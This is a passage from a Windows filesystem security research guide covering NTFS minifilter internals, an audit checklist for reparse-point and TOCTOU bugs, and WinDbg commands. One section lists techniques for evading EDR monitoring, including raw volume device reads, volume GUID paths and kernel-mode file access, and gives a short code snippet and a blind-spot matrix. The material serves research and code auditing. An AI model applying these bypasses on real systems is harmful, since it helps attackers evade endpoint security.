filter at altitude 120000–420000 is invisible to the security product occupying those ranges.

### 9.3 EDR Bypass Techniques via Minifilter Altitude

**Technique 1: Direct device I/O (below all filters)**
```c
// Open the volume device object directly, bypassing FltMgr
HANDLE hVol = CreateFile("\\\\.\\C:", GENERIC_READ | GENERIC_WRITE,
    FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
    FILE_FLAG_NO_BUFFERING, NULL);

// Read raw NTFS data by sector — filesystem filter doesn't see this
BYTE sector[512];
ReadFile(hVol, sector, 512, &bytesRead, NULL);
```

This reads raw volume data. NTFS parsing must be done by the attacker. EDRs monitoring
`IRP_MJ_CREATE` and `IRP_MJ_READ` at the file level do not see raw volume I/O.

**Technique 2: Alternate volume path**
```
\\?\Volume{GUID}\   path bypasses some path-based filter rules
\\.\PhysicalDrive0  raw disk access, no filesystem
```

Some EDR filters normalize paths before comparing to policy rules. Alternate volume GUID
paths may not match if the EDR only knows the drive letter path.

**Technique 3: ZwCreateFile with KernelMode from kernel driver**
Code executing in kernel mode at ring 0, in a driver installed below the EDR's filter
altitude, can call `ZwCreateFile` with `PreviousMode = KernelMode`. This flag tells the
I/O subsystem to skip certain security checks AND can bypass minifilter dispatch depending
on how the call is issued.

**Technique 4: FltSendMessage abuse**
FltSendMessage is a kernel-to-user communication channel used by minifilters to send
data to their user-mode components. If a minifilter's FltSendMessage handler has
insufficient validation, a malicious process that knows the filter's port name can
connect and inject malformed messages, potentially influencing filter behavior.

```windbg
; List loaded minifilters and their altitudes
!fltkd.filters

; Show a specific filter's callbacks
!fltkd.filter <filter_address>

; Show all filter instances on a volume
!fltkd.volumes
```

### 9.4 Security Product Blind Spot Matrix

| Access Technique | Minifilter visibility | ETW visibility | Notes |
|---|---|---|---|
| Normal `CreateFile` | ✅ Full | ✅ Full | Standard path, fully monitored |
| `ZwCreateFile` from user mode | ✅ Full | ✅ Full | Same as CreateFile at driver level |
| `ZwCreateFile` from kernel (KernelMode) | ⚠️ Partial | ✅ ETW kernel | PreviousMode affects some checks |
| Direct volume device I/O | ❌ None | ⚠️ May appear as volume read | Raw sector access, no file semantics |
| Volume GUID path | ⚠️ May bypass path rules | ✅ Full | Filter sees IRP but may not match policy |
| Transacted I/O (TxF) | ⚠️ Depends on filter version | ⚠️ Partial | Older filters may miss |
| ADS access | ✅ Full (if filter checks streams) | ✅ Full | Filter must check StreamContext |
| Kernel driver below filter altitude | ❌ None | ✅ ETW kernel | Requires kernel driver |

---

## 10. Code Audit Checklist for Filesystem Security

When auditing privileged services for filesystem vulnerabilities, apply this checklist to
every file operation that touches a user-influenced path:

**1. Check for OBJ_DONT_REPARSE (0x1000)**
```c
// Vulnerable: no OBJ_DONT_REPARSE — junction/symlink attacks possible
OBJECT_ATTRIBUTES oa;
InitializeObjectAttributes(&oa, &path, OBJ_CASE_INSENSITIVE, NULL, NULL);
NtCreateFile(&h, FILE_WRITE_DATA, &oa, ...);

// Hardened: junction traversal blocked
InitializeObjectAttributes(&oa, &path,
    OBJ_CASE_INSENSITIVE | OBJ_DONT_REPARSE, NULL, NULL);
```

**2. Check for Win32 equivalent flag**
```c
// CreateFile Win32 equivalent:
CreateFile(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
    FILE_FLAG_OPEN_REPARSE_POINT, NULL);
// FILE_FLAG_OPEN_REPARSE_POINT = open the reparse point itself, not target
```

**3. Verify sharing mode prevents squatting**
```c
// Vulnerable: FILE_SHARE_READ allows the attacker to open the file concurrently
CreateFile(path, GENERIC_WRITE, FILE_SHARE_READ, ...);
// A concurrent oplock by the attacker on the same file = TOCTOU

// Safer: FILE_SHARE_NONE prevents concurrent opens
CreateFile(path, GENERIC_WRITE, 0 /* FILE_SHARE_NONE */, ...);
```

**4. Check delete-then-create patterns**
If the service:
1. Validates a path doesn't contain a file
2. Creates the file at that path

Between step 1 and 2, an attacker can create a hard link at that path, redirecting the
creation to a different MFT record.

**5. Inspect temp directory usage**
Services that write to system temp (`%TEMP%`, `%TMP%`, `C:\Windows\Temp`) in a world-writable
location are targets for junction swapping. Services should use private temp directories with
restrictive DACLs.

**6. Check for race in rename operations**
The sequence `write temp → rename temp → final path` has a race between write and rename.
Oplock on the temp file → junction swap → rename lands in System32.

---

## 11. WinDbg Commands for Filesystem Research

```windbg
; ─── FILE OBJECT INSPECTION ──────────────────────────────────────────
!fileobj <address>              ; inspect FILE_OBJECT structure
dt nt!_FILE_OBJECT <address>   ; raw structure dump

; ─── IRP INSPECTION ──────────────────────────────────────────────────
!irp <address>                  ; decode IRP structure (major function, parameters)
!irpfind                        ; find all IRPs in the system (slow)

; ─── NTFS INTERNAL STRUCTURES ─────────────────────────────────────────
; FCB = File Control Block (NTFS-specific file state)
dt NTFS!_SCB <address>          ; Stream Control Block (per-data-stream state)
dt NTFS!_FCB <address>          ; File Control Block

; ─── FILTER MANAGER ─────────────────────────────────────────────────
!fltkd.filters                  ; list loaded minifilters with altitudes
!fltkd.volumes                  ; list volumes and attached filters
!fltkd.filter <addr>            ; detail for one filter (callbacks, etc.)
!fltkd.instance <addr>          ; filter instance on a specific volume

; ─── REPARSE POINTS ──────────────────────────────────────────────────
; Examine reparse data on a file:
; Open file with FILE_FLAG_OPEN_REPARSE_POINT and DeviceIoControl FSCTL_GET_REPARSE_POINT
; In kernel: the $REPARSE_POINT attribute is at type 0xC0 in the MFT record

; ─── OPLOCK STATE ────────────────────────────────────────────────────
; No direct WinDbg extension; look at FCB->Oplock
dt NTFS!_FCB <addr> Oplock
dt nt!_OPLOCK <addr>            ; oplock state machine
```

---

## References

[R-1] *Windows Internals, Part 2 — Storage and File System Chapters* — Mark Russinovich, David Solomon, Alex Ionescu, Andrea Allievi — https://learn.microsoft.com/en-us/sysinternals/resources/windows-internals

[R-2] *Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege* — James Forshaw / Google Project Zero — https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html

[R-3] *symboliclink-testing-tools (SetOpLock, CreateMountPoint, BaitAndSwitch)* — James Forshaw / Google Project Zero — https://github.com/googleprojectzero/symboliclink-testing-tools

[R-4] *Reparse Points (MSDN)* — Microsoft — https://learn.microsoft.com/en-us/windows/win32/fileio/reparse-points

[R-5] *Opportunistic Locks (MSDN)* — Microsoft — https://docs.microsoft.com/en-us/windows/win32/fileio/opportunistic-locks

[R-6] *New Technologies File System (NTFS) — libfsntfs documentation* — libyal project — https://github.com/libyal/libfsntfs

[R-7] *File System Filter Drivers (WDK)* — Microsoft — https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/file-system-filter-drivers
